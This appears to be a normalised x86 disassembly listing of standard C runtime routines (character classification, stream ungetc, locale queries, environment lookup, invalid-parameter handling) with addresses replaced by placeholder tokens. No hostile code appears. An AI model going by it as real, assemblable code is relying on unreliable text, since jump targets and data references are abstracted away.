push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
cmp eax edi
jne r-xdata
cmp [ ebp - 0x24 ] 0xffffffff
je r-xdata
push [ ebp - 0x20 ]
call sub_2009d98
pop ecx
mov [ ebp - 0x20 ] edi
jmp r-xdata
mov ecx [ ebp - 0x30 ]
mov [ ecx ] eax
sub_202315c
mov edi edi
push ebp
mov ebp esp
mov eax 0xffff
sub esp 0x14
cmp [ ebp + 0x8 ] ax
jne r-xdata
mov eax 0x100
cmp [ ebp + 0x8 ] ax
jae r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x14 ]
call sub_20099ee
mov eax [ ebp - 0x14 ]
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x14 ]
push 0x1
push eax
call sub_2024c6f
add esp 0x1c
test eax eax
jne r-xdata
movzx eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov ax [ ecx + eax * 2 ]
and ax [ ebp + 0xc ]
movzx eax ax
mov [ ebp - 0x4 ] eax
jmp r-xdata
movzx eax [ ebp - 0x4 ]
movzx ecx [ ebp + 0xc ]
and eax ecx
leave
retn
cmp [ ebp - 0x8 ] 0x0
je r-xdata
and [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
sub_20231e6
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax 0xffff
cmp [ ebp + 0x8 ] ax
jne r-xdata
mov eax 0x100
cmp [ ebp + 0x8 ] ax
jae r-xdata
xor eax eax
leave
retn
cmp [ rw-data ] 0x0
jne r-xdata
movzx eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
movzx ecx [ ebp + 0xc ]
and eax ecx
leave
retn
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_202315c
add esp 0xc
leave
retn
push [ rw-data ]
lea eax [ ebp - 0x4 ]
push [ rw-data ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push 0x1
push rw-data
call sub_2024c6f
add esp 0x1c
sub_2023267
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_20099ee
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x103
lea eax [ ebp - 0x10 ]
push eax
push 0x103
push [ ebp + 0x8 ]
call sub_2014880
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_20232bd
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_2023267
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x103
pop ebp
retn
sub_20232ed
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_20099ee
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x1
lea eax [ ebp - 0x10 ]
push eax
push 0x1
push [ ebp + 0x8 ]
call sub_2014880
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_202333e
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_20232ed
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x1
pop ebp
retn
sub_202336c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_20099ee
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x2
lea eax [ ebp - 0x10 ]
push eax
push 0x2
push [ ebp + 0x8 ]
call sub_2014880
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_20233bd
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_202336c
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x2
pop ebp
retn
sub_20233eb
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_20099ee
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_2014880
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_202343c
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_20233eb
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x4
pop ebp
retn
sub_202346a
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_20099ee
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x80
lea eax [ ebp - 0x10 ]
push eax
push 0x80
push [ ebp + 0x8 ]
call sub_2014880
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_20234c0
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_202346a
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x80
pop ebp
retn
sub_20234f0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_20099ee
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8
lea eax [ ebp - 0x10 ]
push eax
push 0x8
push [ ebp + 0x8 ]
call sub_2014880
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_2023541
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_20234f0
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8
pop ebp
retn
sub_202356f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_20099ee
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x10
lea eax [ ebp - 0x10 ]
push eax
push 0x10
push [ ebp + 0x8 ]
call sub_2014880
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_20235c0
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_202356f
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x10
pop ebp
retn
sub_20235ee
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_20099ee
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x107
lea eax [ ebp - 0x10 ]
push eax
push 0x107
push [ ebp + 0x8 ]
call sub_2014880
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_2023644
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_20235ee
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x107
pop ebp
retn
sub_2023674
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_20099ee
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x157
lea eax [ ebp - 0x10 ]
push eax
push 0x157
push [ ebp + 0x8 ]
call sub_2014880
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_20236ca
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_2023674
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x157
pop ebp
retn
sub_20236fa
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_20099ee
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x117
lea eax [ ebp - 0x10 ]
push eax
push 0x117
push [ ebp + 0x8 ]
call sub_2014880
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_2023750
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_20236fa
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x117
pop ebp
retn
sub_2023780
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_20099ee
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x20
lea eax [ ebp - 0x10 ]
push eax
push 0x20
push [ ebp + 0x8 ]
call sub_2014880
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_20237d1
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_2023780
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x20
pop ebp
retn
sub_202381e
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_2023267
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_2023841
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_20232bd
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_2023860
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_20235ee
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_2023883
mov edi edi
push ebp
mov ebp esp
movzx eax [ ebp + 0x8 ]
push eax
call sub_2023644
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
cmp [ ebp + 0x8 ] 0x5f
je r-xdata
pop ebp
retn
sub_20238a4
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x40
push edi
jne r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0xffffffff
je r-xdata
push esi
call sub_20134c9
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
mov eax [ esi + 0xc ]
test al 0x1
jne r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
xor edi edi
cmp [ esi + 0x8 ] edi
jne r-xdata
test al al
jns r-xdata
call sub_200fb13
xor edi edi
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov edi eax
sar edi 0x5
shl ecx 0x6
add ecx [ edi * 4 + rw-data ]
jmp r-xdata
mov eax [ esi ]
cmp eax [ esi + 0x8 ]
jne r-xdata
push esi
call sub_20204a6
pop ecx
test al 0x2
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
dec [ esi ]
test [ esi + 0xc ] 0x40
mov eax [ esi ]
je r-xdata
cmp [ esi + 0x4 ] edi
jne r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov [ eax ] bl
cmp [ eax ] bl
je r-xdata
inc eax
mov [ esi ] eax
test [ eax + 0x24 ] 0x80
je r-xdata
pop ebx
mov eax [ esi + 0xc ]
inc [ esi + 0x4 ]
and eax 0xffffffef
or eax 0x1
mov [ esi + 0xc ] eax
mov eax ebx
and eax 0xff
jmp r-xdata
inc eax
mov [ esi ] eax
sub_2023995
push 0xc
push r--data
call sub_200db54
xor eax eax
xor esi esi
cmp [ ebp + 0xc ] esi
setne al
cmp eax esi
jne r-xdata
push [ ebp + 0xc ]
call sub_20126ad
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_20238a4
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_20239fd
mov eax [ ebp - 0x1c ]
call sub_200fb13
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_200fa90
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_200db99
retn
sub_2023a07
push 0x10
push r--data
call sub_200db54
xor eax eax
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp ebx edi
setne al
cmp eax edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_200fb13
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_200fa90
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
push [ rw-data ]
call [ HeapSize@IAT ]
mov esi eax
push 0x4
call sub_2010e3c
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_2010f6a
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
call sub_200db99
retn
mov esi [ ebp - 0x1c ]
mov esi [ ebx - 0x4 ]
sub esi 0x9
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov eax esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2023aa1
cmp [ ebp - 0x20 ] edi
jne r-xdata
sub_2023ab3
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
test [ rw-data ] 0x1
push esi
je r-xdata
call sub_2018ad2
test eax eax
je r-xdata
push 0xa
call sub_200c8ad
pop ecx
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_2018d2e
pop ecx
push 0x3
call sub_200b9e5
int3
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov esi [ ebp + 0x4 ]
lea eax [ ebp + 0x4 ]
mov [ ebp - 0x20c ] eax
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] esi
mov eax [ eax - 0x4 ]
push 0x50
mov [ ebp - 0x21c ] eax
lea eax [ ebp - 0x328 ]
push 0x0
push eax
call sub_2013580
lea eax [ ebp - 0x328 ]
add esp 0xc
mov [ ebp - 0x2d8 ] eax
lea eax [ ebp - 0x2d0 ]
push 0x0
mov [ ebp - 0x328 ] 0x40000015
mov [ ebp - 0x31c ] esi
mov [ ebp - 0x2d4 ] eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x2d8 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
sub_2023bca
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
and edx [ ebp + 0xc ]
not ecx
and ecx eax
or ecx edx
mov [ rw-data ] ecx
pop ebp
retn
sub_2023c04
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_20099ee
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ GetLocaleInfoW@IAT ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_2023c38
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push ebx
mov ebx [ GetLocaleInfoW@IAT ]
push esi
push edi
xor edi edi
xor esi esi
inc edi
cmp eax esi
jne r-xdata
cmp eax 0x2
je r-xdata
push esi
push esi
push edi
push esi
call ebx
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ GetLocaleInfoA@IAT ]
cmp eax esi
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] edi
jmp r-xdata
cmp eax edi
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
cmp [ ebp + 0x1c ] esi
jne r-xdata
xor eax eax
jmp r-xdata
push esi
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call ebx
mov ecx eax
mov [ ebp - 0x8 ] ecx
cmp ecx esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_200b53e
leave
retn
jle r-xdata
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
push [ ebp - 0x8 ]
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call ebx
test eax eax
je r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
push edi
call sub_201418b
pop ecx
mov eax esi
jmp r-xdata
push esi
push esi
cmp [ ebp + 0x18 ] esi
jne r-xdata
push eax
call sub_2009eef
pop ecx
cmp eax esi
je r-xdata
call sub_2023130
mov edi esp
cmp edi esi
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push esi
push esi
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
push 0xffffffff
push edi
push esi
push [ ebp + 0x1c ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
cmp edi esi
je r-xdata
sub_2023d77
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_20099ee
push [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_2023c38
add esp 0x18
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_2023db4
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
xor edi edi
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x28 ] eax
cmp eax edi
jne r-xdata
cmp esi edi
je r-xdata
call sub_200fb13
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_200fa90
add esp 0x14
xor eax eax
jmp r-xdata
cmp ecx edi
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_200b53e
leave
retn
push 0x8
pop ecx
xor eax eax
lea edi [ ebp - 0x24 ]
push 0x7
[ edi ]
pop edi
push ebx
cmp [ eax ] edi
je r-xdata
mov dl [ esi ]
movzx ecx dl
mov eax ecx
and ecx edi
mov bl 0x1
shl bl cl
shr eax 0x3
lea eax [ ebp + eax - 0x24 ]
or [ eax ] bl
inc esi
test dl dl
jne r-xdata
mov edx [ ebp - 0x2c ]
test edx edx
jne r-xdata
mov al [ edx ]
movzx esi al
xor ebx ebx
mov ecx esi
and ecx edi
inc ebx
shl ebx cl
shr esi 0x3
mov cl [ ebp + esi - 0x24 ]
test cl bl
jne r-xdata
mov eax [ ebp - 0x28 ]
mov edx [ eax ]
jmp r-xdata
test al al
je r-xdata
mov ebx edx
jmp r-xdata
inc edx
cmp [ edx ] 0x0
jne r-xdata
movzx esi [ edx ]
xor eax eax
mov ecx esi
and ecx edi
inc eax
shl eax cl
shr esi 0x3
mov cl [ ebp + esi - 0x24 ]
test cl al
jne r-xdata
jmp r-xdata
mov [ edx ] 0x0
inc edx
inc edx
mov eax [ ebp - 0x28 ]
mov [ eax ] edx
mov eax ebx
sub eax edx
neg eax
sbb eax eax
and eax ebx
pop ebx
sub_2023ea2
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push esi
mov esi [ rw-data ]
jne r-xdata
push edi
test esi esi
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ rw-data ] esi
je r-xdata
pop esi
pop ebp
retn
xor eax eax
push [ ebp + 0x8 ]
call sub_2016140
pop ecx
mov edi eax
jmp r-xdata
call sub_2024db5
test eax eax
jne r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
push eax
call sub_2016140
pop ecx
cmp eax edi
jbe r-xdata
add esi 0x4
mov eax [ esi ]
cmp [ eax + edi ] 0x3d
jne r-xdata
push edi
push [ ebp + 0x8 ]
push eax
call sub_2024d9b
add esp 0xc
test eax eax
je r-xdata
mov eax [ esi ]
lea eax [ eax + edi + 0x1 ]
jmp r-xdata
pop edi
sub_2023f29
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor ebx ebx
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ esi ] ebx
cmp eax ebx
je r-xdata
call sub_200fb13
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_200fa90
add esp 0x14
mov eax esi
jmp r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp [ ebp + 0xc ] ebx
ja r-xdata
pop esi
pop ebx
pop ebp
retn
cmp eax ebx
je r-xdata
jmp r-xdata
push edi
push [ ebp + 0x10 ]
call sub_2023ea2
mov edi eax
pop ecx
cmp edi ebx
je r-xdata
mov [ eax ] bl
xor eax eax
push edi
call sub_2016140
inc eax
pop ecx
mov [ esi ] eax
cmp [ ebp + 0xc ] ebx
je r-xdata
cmp eax [ ebp + 0xc ]
jbe r-xdata
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_200a6e1
add esp 0xc
test eax eax
je r-xdata
push 0x22
pop eax
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_200f929
add esp 0x14
pop edi
sub_2023fbe
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
push edi
xor edi edi
cmp ebx edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx ] edi
cmp eax edi
je r-xdata
call sub_200fb13
push 0x16
pop esi
push edi
push edi
push edi
push edi
push edi
mov [ eax ] esi
call sub_200fa90
add esp 0x14
mov eax esi
jmp r-xdata
cmp [ ebp + 0xc ] edi
je r-xdata
mov [ eax ] edi
pop edi
pop esi
leave
retn
push [ ebp + 0xc ]
call sub_2023ea2
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax edi
je r-xdata
xor eax eax
push eax
call sub_2016140
mov esi eax
inc esi
push 0x1
push esi
call sub_2024e4c
add esp 0xc
mov [ ebx ] eax
cmp eax edi
jne r-xdata
push [ ebp - 0x4 ]
push esi
push eax
call sub_200a6e1
add esp 0xc
test eax eax
je r-xdata
call sub_200fb13
mov [ eax ] 0xc
call sub_200fb13
mov eax [ eax ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax edi
je r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_200f929
add esp 0x14
mov [ eax ] esi
sub_2024062
push 0x10
push r--data
call sub_200db54
xor eax eax
xor esi esi
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
mov edi 0x7fff
push edi
push [ ebp + 0x8 ]
call sub_2024e8c
pop ecx
pop ecx
cmp eax edi
sbb eax eax
neg eax
je r-xdata
call sub_200fb13
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_200fa90
add esp 0x14
xor eax eax
jmp r-xdata
push 0x7
call sub_2010e3c
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x8 ]
call sub_2023ea2
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_20240dc
mov eax [ ebp - 0x1c ]
call sub_200db99
retn
sub_20240e5
push 0xc
push r--data
call sub_200db54
push 0x7
call sub_2010e3c
pop ecx
xor ebx ebx
mov [ ebp - 0x4 ] ebx
xor eax eax
mov edi [ ebp + 0x8 ]
cmp edi ebx
setne al
cmp eax ebx
jne r-xdata
mov [ edi ] ebx
mov ecx [ ebp + 0xc ]
cmp ecx ebx
je r-xdata
call sub_200fb13
push 0x16
pop esi
mov [ eax ] esi
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_200fa90
add esp 0x14
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
cmp [ ebp + 0x10 ] ebx
ja r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_20241b4
